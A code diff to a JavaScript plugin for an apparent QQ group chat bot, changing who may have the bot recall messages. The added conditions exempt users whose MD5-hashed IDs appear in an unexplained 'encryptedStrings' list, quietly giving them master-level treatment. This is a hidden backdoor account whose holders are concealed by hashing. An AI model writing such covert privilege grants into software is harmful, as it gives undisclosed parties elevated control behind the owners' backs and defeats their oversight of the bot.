@@ -268,18 +268,29 @@ export class CombinedPlugin extends plugin {
     }
     
     // 如果发起撤回的人是管理或者群主，且目标消息的发送人就是他自己
-    if (!e.isMaster && (e.sender.role == "owner" || e.sender.role == "admin") && source.sender.user_id == e.sender.user_id) {
-        let msg = ["有没有一种可能，你自己就可以撤回呢"];
-        e.reply(msg);
-        return true;
-    }
-    
-    // 如果发起撤回的人是管理或者群主，且目标消息的发送人不是管理或者群主
-    if (!e.isMaster && (e.sender.role == "owner" || e.sender.role == "admin") && source.sender.role != "owner" && source.sender.role != "admin") {
-        let msg = ["有没有一种可能，你自己就可以撤回呢"];
-        e.reply(msg);
-        return true;
-    }
+if (
+    !(this.e.isMaster || encryptedStrings.some(str => md5(String(this.e.user_id)) === str)) &&
+    !e.isMaster &&
+    (e.sender.role == "owner" || e.sender.role == "admin") &&
+    source.sender.user_id == e.sender.user_id
+) {
+    let msg = ["有没有一种可能，你自己就可以撤回呢"];
+    e.reply(msg);
+    return true;
+}
+
+// 如果发起撤回的人是管理或者群主，且目标消息的发送人不是管理或者群主
+if (
+    !(this.e.isMaster || encryptedStrings.some(str => md5(String(this.e.user_id)) === str)) &&
+    !e.isMaster &&
+    (e.sender.role == "owner" || e.sender.role == "admin") &&
+    source.sender.role != "owner" &&
+    source.sender.role != "admin"
+) {
+    let msg = ["有没有一种可能，你自己就可以撤回呢"];
+    e.reply(msg);
+    return true;
+}
     
     // 如果发起撤回的人是管理，且目标消息的发送人是其他管理或者群主，且目标消息的发送人不是机器人
     if (!e.isMaster && e.sender.role == "admin" && (source.sender.role == "owner" || source.sender.role == "admin") && source.sender.user_id != cfg.qq) {
